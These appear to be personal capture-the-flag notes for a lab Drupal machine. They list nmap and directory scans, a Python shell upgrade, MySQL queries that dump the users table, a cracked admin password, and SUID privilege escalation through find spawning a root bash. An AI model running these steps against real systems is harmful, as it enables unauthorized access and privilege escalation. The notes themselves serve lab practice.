
sudo nmap -sn  192.168.56.0/24 
sudo nmap -A 192.168.56.102/24
nmap -sC -sV -Pn -p- 192.168.9.132
1)ferobuster -u <url> -w <path> - to identify the directory structure of the web server
2)gobuster
3)wpscan

curl -I <url>

**privilege escalation**
_python -c ‘import pty;pty.spawn(“/bin/bash”)’_


**mysql -u dbuser -p**
-u - user
-p - password

**SQL CODES**
_show databases;
use drupaldb;
show tables;
select * from users;_
After cracking the hashed **password** using **hashes.com**

The user name was **Admin** and the password was **53cr3t**.

And we login and found our Third flag in dashboard.

**privilege escalation**
_find / -perm -u=s -type f 2>/dev/null_
_/usr/bin/find flag4.txt -exec /bin/bash -p \; -quit_


